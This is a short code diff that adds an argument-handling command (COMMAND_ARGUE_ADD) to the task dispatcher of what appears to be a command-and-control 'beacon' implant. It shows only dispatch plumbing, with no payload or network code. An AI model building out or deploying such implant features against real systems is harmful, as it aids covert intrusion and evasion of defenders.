@@ -1,5 +1,6 @@
 #include "pch.h"
 
+#include "argument.h"
 #include "beacon.h"
 #include "command.h"
 #include "filesystem.h"
@@ -47,6 +48,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_EXECUTE:
 			Execute(buffer, size);
+			break;
+		case COMMAND_ARGUE_ADD:
+			ArgumentAdd(buffer, size);
 			break;
 	}
 }
